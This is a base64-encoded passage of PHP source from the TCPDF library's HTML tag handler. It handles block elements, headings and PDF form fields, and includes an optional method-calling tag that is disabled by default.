lmIChpc3NldCgkcGFyZW50WydsaXN0dHlwZSddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRwYXJlbnRbJ2xpc3R0eXBlJ10pKSB7CgkJCQkJCSR0aGlzLT5saXNwYWNlciA9ICRwYXJlbnRbJ2xpc3R0eXBlJ107CgkJCQkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5saXN5bWJvbCkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+bGlzeW1ib2wpKSB7CgkJCQkJCSR0aGlzLT5saXNwYWNlciA9ICR0aGlzLT5saXN5bWJvbDsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+bGlzcGFjZXIgPSAnISc7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnYmxvY2txdW90ZSc6IHsKCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJJHRoaXMtPnJNYXJnaW4gKz0gJHRoaXMtPmxpc3RpbmRlbnQ7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5sTWFyZ2luICs9ICR0aGlzLT5saXN0aW5kZW50OwoJCQkJfQoJCQkJKyskdGhpcy0+bGlzdGluZGVudGxldmVsOwoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2JyJzogewoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2Rpdic6IHsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsICRmaXJzdHRhZyk7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdwJzogewoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3ByZSc6IHsKCQkJCSR0aGlzLT5hZGRIVE1MVmVydFNwYWNlKCRoYnosICRoYiwgJGNlbGwsICRmaXJzdHRhZyk7CgkJCQkkdGhpcy0+cHJlbW9kZSA9IHRydWU7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdzdXAnOiB7CgkJCQkkdGhpcy0+c2V0WFkoJHRoaXMtPkdldFgoKSwgJHRoaXMtPkdldFkoKSAtICgoMC43ICogJHRoaXMtPkZvbnRTaXplUHQpIC8gJHRoaXMtPmspKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3N1Yic6IHsKCQkJCSR0aGlzLT5zZXRYWSgkdGhpcy0+R2V0WCgpLCAkdGhpcy0+R2V0WSgpICsgKCgwLjMgKiAkdGhpcy0+Rm9udFNpemVQdCkgLyAkdGhpcy0+aykpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaDEnOgoJCQljYXNlICdoMic6CgkJCWNhc2UgJ2gzJzoKCQkJY2FzZSAnaDQnOgoJCQljYXNlICdoNSc6CgkJCWNhc2UgJ2g2JzogewoJCQkJJHRoaXMtPmFkZEhUTUxWZXJ0U3BhY2UoJGhieiwgJGhiLCAkY2VsbCwgJGZpcnN0dGFnKTsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vIEZvcm0gZmllbGRzIChzaW5jZSA0LjguMDAwIC0gMjAwOS0wOS0wNykKCQkJY2FzZSAnZm9ybSc6IHsKCQkJCWlmIChpc3NldCgkdGFnWydhdHRyaWJ1dGUnXVsnYWN0aW9uJ10pKSB7CgkJCQkJJHRoaXMtPmZvcm1fYWN0aW9uID0gJHRhZ1snYXR0cmlidXRlJ11bJ2FjdGlvbiddOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+RXJyb3IoJ1BsZWFzZSBleHBsaWNpdGx5IHNldCBhY3Rpb24gYXR0cmlidXRlIHBhdGghJyk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ2VuY3R5cGUnXSkpIHsKCQkJCQkkdGhpcy0+Zm9ybV9lbmN0eXBlID0gJHRhZ1snYXR0cmlidXRlJ11bJ2VuY3R5cGUnXTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPmZvcm1fZW5jdHlwZSA9ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydtZXRob2QnXSkpIHsKCQkJCQkkdGhpcy0+Zm9ybV9tb2RlID0gJHRhZ1snYXR0cmlidXRlJ11bJ21ldGhvZCddOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+Zm9ybV9tb2RlID0gJ3Bvc3QnOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnaW5wdXQnOiB7CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ25hbWUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGFnWydhdHRyaWJ1dGUnXVsnbmFtZSddKSkgewoJCQkJCSRuYW1lID0gJHRhZ1snYXR0cmlidXRlJ11bJ25hbWUnXTsKCQkJCX0gZWxzZSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQkkcHJvcCA9IGFycmF5KCk7CgkJCQkkb3B0ID0gYXJyYXkoKTsKCQkJCWlmIChpc3NldCgkdGFnWydhdHRyaWJ1dGUnXVsncmVhZG9ubHknXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGFnWydhdHRyaWJ1dGUnXVsncmVhZG9ubHknXSkpIHsKCQkJCQkkcHJvcFsncmVhZG9ubHknXSA9IHRydWU7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ3ZhbHVlJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ3ZhbHVlJ10pKSB7CgkJCQkJJHZhbHVlID0gJHRhZ1snYXR0cmlidXRlJ11bJ3ZhbHVlJ107CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ21heGxlbmd0aCddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0YWdbJ2F0dHJpYnV0ZSddWydtYXhsZW5ndGgnXSkpIHsKCQkJCQkkb3B0WydtYXhsZW4nXSA9IGludHZhbCgkdGFnWydhdHRyaWJ1dGUnXVsnbWF4bGVuZ3RoJ10pOwoJCQkJfQoJCQkJJGggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydzaXplJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ3NpemUnXSkpIHsKCQkJCQkkdyA9IGludHZhbCgkdGFnWydhdHRyaWJ1dGUnXVsnc2l6ZSddKSAqICR0aGlzLT5HZXRTdHJpbmdXaWR0aChjaHIoMzIpKSAqIDI7CgkJCQl9IGVsc2UgewoJCQkJCSR3ID0gJGg7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ2NoZWNrZWQnXSkgQU5EICgoJHRhZ1snYXR0cmlidXRlJ11bJ2NoZWNrZWQnXSA9PSAnY2hlY2tlZCcpIE9SICgkdGFnWydhdHRyaWJ1dGUnXVsnY2hlY2tlZCddID09ICd0cnVlJykpKSB7CgkJCQkJJGNoZWNrZWQgPSB0cnVlOwoJCQkJfSBlbHNlIHsKCQkJCQkkY2hlY2tlZCA9IGZhbHNlOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0YWdbJ2FsaWduJ10pKSB7CgkJCQkJc3dpdGNoICgkdGFnWydhbGlnbiddKSB7CgkJCQkJCWNhc2UgJ0MnOiB7CgkJCQkJCQkkb3B0WydxJ10gPSAxOwoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnUic6IHsKCQkJCQkJCSRvcHRbJ3EnXSA9IDI7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdMJzoKCQkJCQkJZGVmYXVsdDogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQlzd2l0Y2ggKCR0YWdbJ2F0dHJpYnV0ZSddWyd0eXBlJ10pIHsKCQkJCQljYXNlICd0ZXh0JzogewoJCQkJCQlpZiAoaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJJG9wdFsndiddID0gJHZhbHVlOwoJCQkJCQl9CgkJCQkJCSR0aGlzLT5UZXh0RmllbGQoJG5hbWUsICR3LCAkaCwgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAncGFzc3dvcmQnOiB7CgkJCQkJCWlmIChpc3NldCgkdmFsdWUpKSB7CgkJCQkJCQkkb3B0Wyd2J10gPSAkdmFsdWU7CgkJCQkJCX0KCQkJCQkJJHByb3BbJ3Bhc3N3b3JkJ10gPSAndHJ1ZSc7CgkJCQkJCSR0aGlzLT5UZXh0RmllbGQoJG5hbWUsICR3LCAkaCwgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAnY2hlY2tib3gnOiB7CgkJCQkJCWlmICghaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJJHRoaXMtPkNoZWNrQm94KCRuYW1lLCAkdywgJGNoZWNrZWQsICRwcm9wLCAkb3B0LCAkdmFsdWUsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAncmFkaW8nOiB7CgkJCQkJCWlmICghaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJJHRoaXMtPlJhZGlvQnV0dG9uKCRuYW1lLCAkdywgJHByb3AsICRvcHQsICR2YWx1ZSwgJGNoZWNrZWQsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAnc3VibWl0JzogewoJCQkJCQlpZiAoIWlzc2V0KCR2YWx1ZSkpIHsKCQkJCQkJCSR2YWx1ZSA9ICdzdWJtaXQnOwoJCQkJCQl9CgkJCQkJCSR3ID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR2YWx1ZSkgKiAxLjU7CgkJCQkJCSRoICo9IDEuNjsKCQkJCQkJJHByb3AgPSBhcnJheSgnbGluZVdpZHRoJz0+MSwgJ2JvcmRlclN0eWxlJz0+J2JldmVsZWQnLCAnZmlsbENvbG9yJz0+YXJyYXkoMTk2LCAxOTYsIDE5NiksICdzdHJva2VDb2xvcic9PmFycmF5KDI1NSwgMjU1LCAyNTUpKTsKCQkJCQkJJGFjdGlvbiA9IGFycmF5KCk7CgkJCQkJCSRhY3Rpb25bJ1MnXSA9ICdTdWJtaXRGb3JtJzsKCQkJCQkJJGFjdGlvblsnRiddID0gJHRoaXMtPmZvcm1fYWN0aW9uOwoJCQkJCQlpZiAoJHRoaXMtPmZvcm1fZW5jdHlwZSAhPSAnRkRGJykgewoJCQkJCQkJJGFjdGlvblsnRmxhZ3MnXSA9IGFycmF5KCdFeHBvcnRGb3JtYXQnKTsKCQkJCQkJfQoJCQkJCQlpZiAoJHRoaXMtPmZvcm1fbW9kZSA9PSAnZ2V0JykgewoJCQkJCQkJJGFjdGlvblsnRmxhZ3MnXSA9IGFycmF5KCdHZXRNZXRob2QnKTsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+QnV0dG9uKCRuYW1lLCAkdywgJGgsICR2YWx1ZSwgJGFjdGlvbiwgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAncmVzZXQnOiB7CgkJCQkJCWlmICghaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJJHZhbHVlID0gJ3Jlc2V0JzsKCQkJCQkJfQoJCQkJCQkkdyA9ICR0aGlzLT5HZXRTdHJpbmdXaWR0aCgkdmFsdWUpICogMS41OwoJCQkJCQkkaCAqPSAxLjY7CgkJCQkJCSRwcm9wID0gYXJyYXkoJ2xpbmVXaWR0aCc9PjEsICdib3JkZXJTdHlsZSc9PidiZXZlbGVkJywgJ2ZpbGxDb2xvcic9PmFycmF5KDE5NiwgMTk2LCAxOTYpLCAnc3Ryb2tlQ29sb3InPT5hcnJheSgyNTUsIDI1NSwgMjU1KSk7CgkJCQkJCSR0aGlzLT5CdXR0b24oJG5hbWUsICR3LCAkaCwgJHZhbHVlLCBhcnJheSgnUyc9PidSZXNldEZvcm0nKSwgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJY2FzZSAnZmlsZSc6IHsKCQkJCQkJJHByb3BbJ2ZpbGVTZWxlY3QnXSA9ICd0cnVlJzsKCQkJCQkJJHRoaXMtPlRleHRGaWVsZCgkbmFtZSwgJHcsICRoLCAkcHJvcCwgJG9wdCwgJycsICcnLCBmYWxzZSk7CgkJCQkJCWlmICghaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJJHZhbHVlID0gJyonOwoJCQkJCQl9CgkJCQkJCSR3ID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR2YWx1ZSkgKiAyOwoJCQkJCQkkaCAqPSAxLjI7CgkJCQkJCSRwcm9wID0gYXJyYXkoJ2xpbmVXaWR0aCc9PjEsICdib3JkZXJTdHlsZSc9PidiZXZlbGVkJywgJ2ZpbGxDb2xvcic9PmFycmF5KDE5NiwgMTk2LCAxOTYpLCAnc3Ryb2tlQ29sb3InPT5hcnJheSgyNTUsIDI1NSwgMjU1KSk7CgkJCQkJCSRqc2FjdGlvbiA9ICd2YXIgZj10aGlzLmdldEZpZWxkKFwnJy4kbmFtZS4nXCcpOyBmLmJyb3dzZUZvckZpbGVUb1N1Ym1pdCgpOyc7CgkJCQkJCSR0aGlzLT5CdXR0b24oJ0ZCXycuJG5hbWUsICR3LCAkaCwgJHZhbHVlLCAkanNhY3Rpb24sICRwcm9wLCAkb3B0LCAnJywgJycsIGZhbHNlKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWNhc2UgJ2hpZGRlbic6IHsKCQkJCQkJaWYgKGlzc2V0KCR2YWx1ZSkpIHsKCQkJCQkJCSRvcHRbJ3YnXSA9ICR2YWx1ZTsKCQkJCQkJfQoJCQkJCQkkb3B0WydmJ10gPSBhcnJheSgnaW52aXNpYmxlJywgJ2hpZGRlbicpOwoJCQkJCQkkdGhpcy0+VGV4dEZpZWxkKCRuYW1lLCAwLCAwLCAkcHJvcCwgJG9wdCwgJycsICcnLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdpbWFnZSc6IHsKCQkJCQkJLy8gVEhJUyBUWVBFIE1VU1QgQkUgRklYRUQKCQkJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydzcmMnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGFnWydhdHRyaWJ1dGUnXVsnc3JjJ10pKSB7CgkJCQkJCQkkaW1nID0gJHRhZ1snYXR0cmlidXRlJ11bJ3NyYyddOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJJHZhbHVlID0gJ2ltZyc7CgkJCQkJCS8vJG9wdFsnbWsnXSA9IGFycmF5KCdpJz0+JGltZywgJ3RwJz0+MSwgJ2lmJz0+YXJyYXkoJ3N3Jz0+J0EnLCAncyc9PidBJywgJ2ZiJz0+ZmFsc2UpKTsKCQkJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydvbmNsaWNrJ10pIEFORCAhZW1wdHkoJHRhZ1snYXR0cmlidXRlJ11bJ29uY2xpY2snXSkpIHsKCQkJCQkJCSRqc2FjdGlvbiA9ICR0YWdbJ2F0dHJpYnV0ZSddWydvbmNsaWNrJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkanNhY3Rpb24gPSAnJzsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+QnV0dG9uKCRuYW1lLCAkdywgJGgsICR2YWx1ZSwgJGpzYWN0aW9uLCAkcHJvcCwgJG9wdCwgJycsICcnLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQljYXNlICdidXR0b24nOiB7CgkJCQkJCWlmICghaXNzZXQoJHZhbHVlKSkgewoJCQkJCQkJJHZhbHVlID0gJyAnOwoJCQkJCQl9CgkJCQkJCSR3ID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR2YWx1ZSkgKiAxLjU7CgkJCQkJCSRoICo9IDEuNjsKCQkJCQkJJHByb3AgPSBhcnJheSgnbGluZVdpZHRoJz0+MSwgJ2JvcmRlclN0eWxlJz0+J2JldmVsZWQnLCAnZmlsbENvbG9yJz0+YXJyYXkoMTk2LCAxOTYsIDE5NiksICdzdHJva2VDb2xvcic9PmFycmF5KDI1NSwgMjU1LCAyNTUpKTsKCQkJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydvbmNsaWNrJ10pIEFORCAhZW1wdHkoJHRhZ1snYXR0cmlidXRlJ11bJ29uY2xpY2snXSkpIHsKCQkJCQkJCSRqc2FjdGlvbiA9ICR0YWdbJ2F0dHJpYnV0ZSddWydvbmNsaWNrJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkanNhY3Rpb24gPSAnJzsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+QnV0dG9uKCRuYW1lLCAkdywgJGgsICR2YWx1ZSwgJGpzYWN0aW9uLCAkcHJvcCwgJG9wdCwgJycsICcnLCBmYWxzZSk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3RleHRhcmVhJzogewoJCQkJJHByb3AgPSBhcnJheSgpOwoJCQkJJG9wdCA9IGFycmF5KCk7CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ3JlYWRvbmx5J10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ3JlYWRvbmx5J10pKSB7CgkJCQkJJHByb3BbJ3JlYWRvbmx5J10gPSB0cnVlOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWyduYW1lJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ25hbWUnXSkpIHsKCQkJCQkkbmFtZSA9ICR0YWdbJ2F0dHJpYnV0ZSddWyduYW1lJ107CgkJCQl9IGVsc2UgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWyd2YWx1ZSddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0YWdbJ2F0dHJpYnV0ZSddWyd2YWx1ZSddKSkgewoJCQkJCSRvcHRbJ3YnXSA9ICR0YWdbJ2F0dHJpYnV0ZSddWyd2YWx1ZSddOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydjb2xzJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ2NvbHMnXSkpIHsKCQkJCQkkdyA9IGludHZhbCgkdGFnWydhdHRyaWJ1dGUnXVsnY29scyddKSAqICR0aGlzLT5HZXRTdHJpbmdXaWR0aChjaHIoMzIpKSAqIDI7CgkJCQl9IGVsc2UgewoJCQkJCSR3ID0gNDA7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ3Jvd3MnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGFnWydhdHRyaWJ1dGUnXVsncm93cyddKSkgewoJCQkJCSRoID0gaW50dmFsKCR0YWdbJ2F0dHJpYnV0ZSddWydyb3dzJ10pICogJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKTsKCQkJCX0gZWxzZSB7CgkJCQkJJGggPSAxMDsKCQkJCX0KCQkJCSRwcm9wWydtdWx0aWxpbmUnXSA9ICd0cnVlJzsKCQkJCSR0aGlzLT5UZXh0RmllbGQoJG5hbWUsICR3LCAkaCwgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnc2VsZWN0JzogewoJCQkJJGggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydzaXplJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRhZ1snYXR0cmlidXRlJ11bJ3NpemUnXSkpIHsKCQkJCQkkaCAqPSAoJHRhZ1snYXR0cmlidXRlJ11bJ3NpemUnXSArIDEpOwoJCQkJfQoJCQkJJHByb3AgPSBhcnJheSgpOwoJCQkJJG9wdCA9IGFycmF5KCk7CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ25hbWUnXSkgQU5EICFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGFnWydhdHRyaWJ1dGUnXVsnbmFtZSddKSkgewoJCQkJCSRuYW1lID0gJHRhZ1snYXR0cmlidXRlJ11bJ25hbWUnXTsKCQkJCX0gZWxzZSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQkkdyA9IDA7CgkJCQlpZiAoaXNzZXQoJHRhZ1snYXR0cmlidXRlJ11bJ29wdCddKSBBTkQgIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0YWdbJ2F0dHJpYnV0ZSddWydvcHQnXSkpIHsKCQkJCQkkb3B0aW9ucyA9IGV4cGxvZGUoJyMhTndMISMnLCAkdGFnWydhdHRyaWJ1dGUnXVsnb3B0J10pOwoJCQkJCSR2YWx1ZXMgPSBhcnJheSgpOwoJCQkJCWZvcmVhY2ggKCRvcHRpb25zIGFzICR2YWwpIHsKCQkJCQkJaWYgKHN0cnBvcygkdmFsLCAnIyFUYUIhIycpICE9PSBmYWxzZSkgewoJCQkJCQkJJG9wdHMgPSBleHBsb2RlKCcjIVRhQiEjJywgJHZhbCk7CgkJCQkJCQkkdmFsdWVzW10gPSAkb3B0czsKCQkJCQkJCSR3ID0gbWF4KCR3LCAkdGhpcy0+R2V0U3RyaW5nV2lkdGgoJG9wdHNbMV0pKTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSR2YWx1ZXNbXSA9ICR2YWw7CgkJCQkJCQkkdyA9IG1heCgkdywgJHRoaXMtPkdldFN0cmluZ1dpZHRoKCR2YWwpKTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQkkdyAqPSAyOwoJCQkJaWYgKGlzc2V0KCR0YWdbJ2F0dHJpYnV0ZSddWydtdWx0aXBsZSddKSBBTkQgKCR0YWdbJ2F0dHJpYnV0ZSddWydtdWx0aXBsZSddPSdtdWx0aXBsZScpKSB7CgkJCQkJJHByb3BbJ211bHRpcGxlU2VsZWN0aW9uJ10gPSAndHJ1ZSc7CgkJCQkJJHRoaXMtPkxpc3RCb3goJG5hbWUsICR3LCAkaCwgJHZhbHVlcywgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJfSBlbHNlIHsKCQkJCQkkdGhpcy0+Q29tYm9Cb3goJG5hbWUsICR3LCAkaCwgJHZhbHVlcywgJHByb3AsICRvcHQsICcnLCAnJywgZmFsc2UpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAndGNwZGYnOiB7CgkJCQlpZiAoZGVmaW5lZCgnS19UQ1BERl9DQUxMU19JTl9IVE1MJykgQU5EIChLX1RDUERGX0NBTExTX0lOX0hUTUwgPT09IHRydWUpKSB7CgkJCQkJLy8gU3BlY2lhbCB0YWcgdXNlZCB0byBjYWxsIFRDUERGIG1ldGhvZHMKCQkJCQkvLyBUaGlzIHRhZyBpcyBkaXNhYmxlZCBieSBkZWZhdWx0IGJ5IHRoZSBLX1RDUERGX0NBTExTX0lOX0hUTUwgY29uc3RhbnQgb24gVENQREYgY29uZmlndXJhdGlvbiBmaWxlLgoJCQkJCS8vIFBsZWFzZSB1c2UgdGhpcyBmZWF0dXJlIG9ubHkgaWYgeW91IGFyZSBpbiBjb250cm9sIG9mIHRoZSBIVE1MIGNvbnRlbnQgYW5kIHlvdSBhcmUgc3VyZSB0aGF0IGl0IGRvZXMgbm90IGNvbnRhaW4gYW55IGhhcm1mdWwgY29kZS4KCQkJCQlpZiAoIWVtcHR5KCR0YWdbJ2F0dHJpYnV0ZSddWydkYXRhJ10pKSB7CgkJCQkJCSR0Y3BkZl90YWdfZGF0YSA9ICR0aGlzLT51bnNlcmlhbGl6ZVRDUERGdGFnKCR0YWdbJ2F0dHJpYnV0ZSddWydkYXRhJ10pOwoJCQkJCQlpZiAoJHRoaXMtPmFsbG93ZWRUQ1BERnRhZygkdGNwZGZfdGFnX2RhdGFbJ20nXSkpIHsKCQkJCQkJCWNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KCR0aGlzLCAkdGNwZGZfdGFnX2RhdGFbJ20nXSksICR0Y3BkZl90YWdfZGF0YVsncCddKTsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+bmV3bGluZSA9IHRydWU7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDogewoJCQkJYnJlYWs7CgkJCX0KCQl9CgkJLy8gZGVmaW5lIHRhZ3MgdGhhdCBzdXBwb3J0IGJvcmRlcnMgYW5kIGJhY2tncm91bmQgY29sb3JzCgkJJGJvcmRlcnRhZ3MgPSBhcnJheSgnYmxvY2txdW90ZScsJ2JyJywnZGQnLCdkbCcsJ2RpdicsJ2R0JywnaDEnLCdoMicsJ2gzJywnaDQnLCdoNScsJ2g2JywnaHInLCdsaScsJ29sJywncCcsJ3ByZScsJ3VsJywndGNwZGYnLCd0YWJsZScpOwoJCWlmIChpbl9hcnJheSgkdGFnWyd2YWx1ZSddLCAkYm9yZGVydGFncykpIHsKCQkJLy8gc2V0IGJvcmRlcgoJCQkkZG9tWyRrZXldWydib3JkZXJwb3NpdGlvbiddID0gJHRoaXMtPmdldEJvcmRlclN0YXJ0UG9zaXRpb24oKTsKCQl9CgkJaWYgKCRkb21bJGtleV1bJ3NlbGYnXSBBTkQgaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVha2FmdGVyJ10pKSB7CgkJCSRwYmEgPSAkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsncGFnZWJyZWFrYWZ0ZXInXTsKCQkJLy8gY2hlY2sgZm9yIHBhZ2VicmVhawoJCQlpZiAoKCRwYmEgPT0gJ3RydWUnKSBPUiAoJHBiYSA9PSAnbGVmdCcpIE9SICgkcGJhID09ICdyaWdodCcpKSB7CgkJCQkvLyBhZGQgYSBwYWdlIChvciB0cmlnIEFjY2VwdFBhZ2VCcmVhaygpIGZvciBtdWx0aWNvbHVtbiBtb2RlKQoJCQkJJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyICsgMSk7CgkJCX0KCQkJaWYgKCgoJHBiYSA9PSAnbGVmdCcpIEFORCAoKCghJHRoaXMtPnJ0bCkgQU5EICgoJHRoaXMtPnBhZ2UgJSAyKSA9PSAwKSkgT1IgKCgkdGhpcy0+cnRsKSBBTkQgKCgkdGhpcy0+cGFnZSAlIDIpICE9IDApKSkpCgkJCQlPUiAoKCRwYmEgPT0gJ3JpZ2h0JykgQU5EICgoKCEkdGhpcy0+cnRsKSBBTkQgKCgkdGhpcy0+cGFnZSAlIDIpICE9IDApKSBPUiAoKCR0aGlzLT5ydGwpIEFORCAoKCR0aGlzLT5wYWdlICUgMikgPT0gMCkpKSkpIHsKCQkJCS8vIGFkZCBhIHBhZ2UgKG9yIHRyaWcgQWNjZXB0UGFnZUJyZWFrKCkgZm9yIG11bHRpY29sdW1uIG1vZGUpCgkJCQkkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgKyAxKTsKCQkJfQoJCX0KCQlyZXR1cm4gJGRvbTsKCX0KCgkvKioKCSAqIFByb2Nlc3MgY2xvc2luZyB0YWdzLgoJICogQHBhcmFtIGFycmF5ICRkb20gaHRtbCBkb20gYXJyYXkKCSAqIEBwYXJhb